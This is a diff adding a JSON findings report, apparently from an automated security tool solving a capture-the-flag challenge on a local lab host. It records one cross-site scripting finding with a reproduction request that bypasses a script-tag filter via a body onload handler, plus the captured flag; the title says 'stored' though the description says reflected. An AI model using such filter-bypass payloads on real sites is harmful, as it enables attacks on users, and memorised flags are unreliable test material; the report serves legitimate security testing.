@@ -1,0 +1,25 @@
+{
+  "meta": {
+    "created": "2026-04-14T23:53:06.882609+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "58bc7076-6d65-4155-ad95-84d869c03d43",
+      "timestamp": "2026-04-14T23:53:06.882494+00:00",
+      "title": "Stored XSS on /page endpoint reveals CTF flag",
+      "severity": "high",
+      "target": "http://172.17.0.1:60319/page",
+      "description": "The /page endpoint reflects the 'name' query parameter without proper sanitization. While <script> tags are stripped, HTML event handlers like <body onload=...> are not filtered, allowing XSS execution.",
+      "evidence": "flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:60319/page?name=<body onload=alert('XSS')>",
+        "expected": "Response contains success message with flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}"
+      }
+    }
+  ],
+  "diagrams": []
+}
